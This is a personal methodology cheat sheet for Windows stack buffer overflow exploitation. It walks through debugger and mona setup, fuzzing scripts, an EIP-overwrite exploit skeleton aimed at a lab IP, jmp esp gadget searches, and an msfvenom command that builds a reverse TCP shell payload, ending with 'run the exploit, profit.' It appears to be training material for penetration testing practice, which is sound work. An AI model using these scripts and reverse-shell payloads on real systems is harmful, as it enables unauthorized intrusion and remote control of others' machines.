# My methodology

## Setup

### Immunity Debugger

Always run Immunity Debugger as Administrator if you can.

There are generally two ways to use Immunity Debugger to debug an application:

1. Using `File -> Attach` to attack the debugger to the running process.
2. Or by opening Immunity Debugger, and then using `File -> Open` to run the application.

When attaching to an application or opening an application in Immunity Debugger, the application will be paused. Click the "Run" button or press F9.

### Mona Setup

Mona is a powerful plugin for Immunity Debugger that makes exploiting buffer overflows much easier. Download: [:download:\`mona.py &lt;../\_static/files/mona.py&gt;\`](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst#id1)The latest version can be downloaded here: [https://github.com/corelan/mona](https://github.com/corelan/mona)The manual can be found here: [https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

Copy the mona.py file into the PyCommands directory of Immunity Debugger \(usually located at C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands\).

In Immunity Debugger, type the following to set a working directory for mona.

```bash
!mona config -set workingfolder c:\mona\%p
```

## Spiking/Fuzzing

### Raw sockets

The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.

```python
#!/usr/bin/env python3
import socket, time, sys

ip = "127.0.0.1"
port = 9999
timeout = 2
buffer_step = 100
buffer_size_max = 3000

buffer = ""

for i in range(0,buffer_size_max, buffer_step):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("HTER "+buffer[:i]+"\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Check that the EIP register has been overwritten by A's \(\x41\). Make a note of any other registers that have either been overwritten, or are pointing to space in memory which has been overwritten.

### Boofuzz

```python
#!/usr/bin/env python3
from boofuzz import *

RHOST = "127.0.0.1"
RPORT = 9999

s = Session(target=Target(connection=SocketConnection(RHOST,RPORT,proto="tcp")))

s_initialize("FUZZER")
s_string("change_me", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("fuzzme")

s.connect(s_get("FUZZER"))
s.fuzz()
```

## Finding and controlling EIP

```python
#!/usr/bin/env python3
import socket

ip = "10.10.64.104"
port = 1337

offset = 1978

buffer  = b""
buffer += b"OVERFLOW1 " # prefix
buffer += b"1" * offset # overflow
buffer += b"2222" # return
buffer += b"\x90"*16 # padding
buffer += b"" # payload
buffer += b"" # postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

## Finding bad characters

`!mona bytearray -b "\x00"`

```python
#!/usr/bin/env python3
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()
```

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

## Finding the right module

You can list modules with `!mona modules` command, and find unsecured module.

Then try to find position of `jmp esp` instruction\(`FF E4`\)

```bash
!mona jmp -r esp
!mona jmp -r esp -cpb "\x00"
!mona find -s "\xff\xe4" -m <unsecure_module>
```

## Generating shellcode

Generating shellcode with msfvenom is easy.

```bash
msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> EXITFUNC=thread -f c -a <architecture> -b <bad_bytes>

# example
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8990 EXITFUNC=thread -f c -a x86 -b "\x00"
```

## Root

Setup your listener, run the exploit, profit.
